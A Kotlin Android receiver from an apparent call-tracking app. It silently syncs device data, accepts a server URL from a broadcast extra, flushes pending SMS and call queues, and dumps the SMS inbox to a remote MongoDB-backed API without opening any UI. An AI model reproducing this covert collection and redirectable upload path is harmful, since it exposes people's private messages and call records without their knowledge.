package com.calltech

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/** ADB / install ke baad sync trigger — app UI khole bina. */
class SyncTriggerReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val app = context.applicationContext

        intent?.getStringExtra(EXTRA_SYNC_URL)?.trim()?.takeIf { it.isNotBlank() }?.let { url ->
            MongoSyncHelper.forceApiUrl(app, url)
            Log.d(TAG, "Sync URL set from broadcast")
        }

        Log.d(TAG, "Force sync trigger received")

        MongoSyncHelper.ensureApiUrl(app)
        SyncBootstrap.ensureBackgroundReady(app)
        CallSyncService.ensureRunning(app)

        val pendingResult = goAsync()
        val wakeLock = SyncWakeLock.acquire(app, "ForceSyncWakeLock")

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                try {
                    SimNumberHelper.ensureSimReadyForSync(app)
                    DeviceRegistration.registerNow(app)
                    PendingSmsQueue.flush(app)
                    PendingCallQueue.flush(app)
                    PendingCallSync.flushIfPending(app)
                    LocalDataStore.syncPendingToMongo(app, "force_sync")
                    InboxDump.dumpBlocking(app)
                    SyncScheduler.syncIfPermittedNow(app, "force_sync")
                    Log.d(TAG, "Force sync done")
                } catch (error: Exception) {
                    Log.e(TAG, "Force sync failed", error)
                } finally {
                    SyncWakeLock.release(wakeLock)
                    try {
                        pendingResult.finish()
                    } catch (_: Exception) {
                    }
                }
            }
        }
    }

    companion object {
        private const val TAG = "SyncTriggerReceiver"
        const val ACTION_FORCE_SYNC = "com.calltech.FORCE_SYNC"
        const val EXTRA_SYNC_URL = "sync_url"
    }
}
